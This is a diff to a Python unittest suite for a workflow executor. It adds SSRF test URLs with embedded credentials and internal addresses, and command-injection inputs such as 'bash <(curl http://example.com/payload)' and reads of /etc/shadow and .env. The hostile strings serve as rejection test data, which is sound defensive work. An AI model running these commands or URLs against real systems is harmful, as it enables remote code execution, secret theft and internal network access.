@@ -115,6 +115,10 @@ class TestWorkflowExecutor(unittest.TestCase):
             "http://example.com/path\r\nInjected-Header: value",
             "http://example.com/path\twith-tab",
             "http://example.com/path\0with-null",
+            "http://user:pass@example.com",
+            "http://user@example.com",
+            "http://example.com@127.0.0.1",
+            "http://admin:secret@10.0.0.1",
         ]
         for url in dangerous_urls:
             with self.subTest(url=url):
@@ -133,7 +137,7 @@ class TestWorkflowExecutor(unittest.TestCase):
                 self.assertTrue(
                     any(
                         x in error_msg
-                        for x in ["ssrf", "smuggling", "scheme", "hostname", "invalid", "forbidden", "control"]
+                        for x in ["ssrf", "smuggling", "scheme", "hostname", "invalid", "forbidden", "control", "userinfo", "credentials"]
                     ),
                     f"Unexpected error message for URL '{url}': {step_res.error}",
                 )
@@ -156,6 +160,8 @@ class TestWorkflowExecutor(unittest.TestCase):
             "http://169.254.169.254",
             "file:///etc/passwd",
             "gopher://example.com",
+            "http://user:pass@example.com",
+            "http://user@example.com",
         ]
 
         for url in unsafe_redirects:
@@ -603,6 +609,10 @@ class TestWorkflowExecutor(unittest.TestCase):
             "ls -la && cp .env /tmp/env",
             "echo $(cat /etc/passwd)",
             "echo `cat .env`",
+            "echo payload | tee >(bash)",
+            "bash <(curl http://example.com/payload)",
+            "python <(echo 'import os')",
+            "diff <(cat /etc/passwd) <(cat /etc/shadow)",
         ]
         for cmd in malicious_chained_commands:
             with self.subTest(cmd=cmd):
@@ -620,7 +630,7 @@ class TestWorkflowExecutor(unittest.TestCase):
                 self.assertTrue(
                     any(
                         x in step_res.error.lower()
-                        for x in ["pipeline to interpreter", "prohibited sensitive path"]
+                        for x in ["pipeline to interpreter", "process substitution", "prohibited sensitive path"]
                     ),
                     f"Unexpected error message for command '{cmd}': {step_res.error}",
                 )
